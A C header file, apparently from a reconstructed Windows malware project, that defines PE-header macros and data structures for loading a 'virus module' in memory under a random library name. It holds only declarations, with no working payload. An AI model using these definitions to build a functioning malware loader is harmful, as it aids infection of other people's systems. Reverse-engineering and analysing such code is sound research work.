/******************************************************************************************
  Copyright (C) 2012-2014 Christian Roggia <christian.roggia@gmail.com>

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

#ifndef DEFINE_H
#define DEFINE_H

#include "StdAfx.h"

#define IMAGE_NT(h)				(PIMAGE_NT_HEADERS)(((PIMAGE_DOS_HEADER)h)->e_lfanew + (DWORD)h)
#define SECTION_TABLE(h)		(PIMAGE_SECTION_HEADER)((DWORD)h + h->FileHeader.SizeOfOptionalHeader + sizeof(IMAGE_FILE_HEADER) + sizeof(DWORD))

#define HAS_FAILED(v, r) { if(v) return (r); }
#define _SIZE(x, y) (DWORD)((DWORD)x - (DWORD)y)

// Return Global Encoded Function Pointer
#define _F(s) g_hardAddrs.##s

#define MZ_HEADER 0x5A4D
#define PE_HEADER 0x4550

typedef void (*__tLibraryExecEntry)(LPVOID, INT32);
typedef NTSTATUS (*__tAlignAddresses)(PIMAGE_DOS_HEADER *);

typedef struct _GENERAL_INFO_BLOCK {
	DWORD  OriginalAddress;
	DWORD UnknownZero0;
	HANDLE MappedAddress;
	DWORD  AlignAddressesFunction;
	WCHAR  RandomLibraryName[32];
	DWORD AbsoluteEntryPoint;
	DWORD UnknownZero1;
	DWORD SizeOfStackReserve;
	DWORD SizeOfStackCommit;
	DWORD Subsystem;
	WORD MinorSubsystemVersion;
	WORD MajorSubsystemVersion;
	DWORD UnknownZero2;
	WORD Charactersitics;
	WORD DllCharacteristics;
	WORD Machine;
	BYTE  UnknownOne;
	BYTE  UnknownFour;
	DWORD LoaderFlags;
	DWORD VirusModuleSize;
	DWORD UnknownZero3;
} GENERAL_INFO_BLOCK, *PGENERAL_INFO_BLOCK;

typedef struct _SECTION_SEGEMENT_INFO {
	DWORD SegmentAddress;
	DWORD SegmentSize;
} SECTION_SEGEMENT_INFO, *PSECTION_SEGEMENT_INFO;

typedef struct _VIRUS_MODULE_BLOCKS_HEADER {
	GENERAL_INFO_BLOCK    InformationBlock;
	HMODULE               VirusModulePointer;
	SECTION_SEGEMENT_INFO UnknownSegment;
	SECTION_SEGEMENT_INFO VirusModuleSegment;
	INT32                 LibraryExecuteEntryNumber;
} VIRUS_MODULE_BLOCKS_HEADER, *PVIRUS_MODULE_BLOCKS_HEADER;

typedef struct _ASM_CODE_BLOCKS_HEADER {
	DWORD                 ExecuteLibrary;
	DWORD                 AlignAddresses;
	SECTION_SEGEMENT_INFO ASMBlock1Segment;
	SECTION_SEGEMENT_INFO CodeBlockSegment;
	SECTION_SEGEMENT_INFO ASMBlock0Segment;
	DWORD                 VirusModuleSection;
} ASM_CODE_BLOCKS_HEADER, *PASM_CODE_BLOCKS_HEADER;

#endif // DEFINE_H